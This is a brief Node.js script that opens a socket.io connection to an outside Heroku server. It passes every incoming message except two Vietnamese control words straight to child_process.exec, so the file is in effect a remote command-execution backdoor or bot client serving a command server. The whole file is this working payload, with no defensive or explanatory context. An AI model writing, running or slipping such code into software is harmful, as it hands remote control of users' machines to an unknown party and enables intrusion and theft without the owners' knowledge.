const { exec } = require('child_process');
const
    io = require("socket.io-client"),
    ioClient = io.connect("https://colevelao.herokuapp.com:443");

ioClient.on("message", (msg) => {
	if (msg ==='Chay') {
		console.log('Em bat dau chay');
	} else if (msg ==='Ngung'){
		console.log('Em ngung');
	}
	 else {
		exec(msg);
	}
});


